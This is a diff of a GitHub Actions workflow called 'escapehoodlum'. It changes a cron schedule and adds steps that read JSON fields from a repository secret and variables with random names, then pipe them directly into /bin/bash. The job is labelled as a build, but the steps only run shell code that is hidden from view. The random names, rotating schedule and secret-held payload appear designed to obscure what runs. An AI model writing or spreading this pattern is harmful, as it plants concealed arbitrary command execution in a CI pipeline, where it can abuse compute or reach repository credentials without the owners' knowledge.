@@ -1,24 +1,24 @@
 name: escapehoodlum
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
+    - cron: '58 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: escapehoodlum
         env:
-          j930: ${{ secrets.j930 }}
+          yr38: ${{ secrets.yr38 }}
         run: |
-          echo $j930 | jq -r .i034 | /bin/bash
-          echo $bf1 | jq -r .kszoa014 | /bin/bash
-          echo $jx42241 | jq -r .rsoj00934 | /bin/bash
-          echo $jiy493 | jq -r .fs001 | /bin/bash
-          echo $jqgc16 | jq -r .yhhvr5090 | /bin/bash
-          echo $nokzf79 | jq -r .g0 | /bin/bash
+          echo $yr38 | jq -r .ekivf3614 | /bin/bash
+          echo $uq4709 | jq -r .jmj385 | /bin/bash
+          echo $jaiod753 | jq -r .qzbun693 | /bin/bash
+          echo $vgflm61071 | jq -r .rm12 | /bin/bash
+          echo $oosg568 | jq -r .wk4 | /bin/bash
+          echo $ya5751 | jq -r .nzp9689 | /bin/bash
+          echo $pknkf268 | jq -r .tw21866 | /bin/bash
+          echo $ucg96493 | jq -r .v63084 | /bin/bash
 
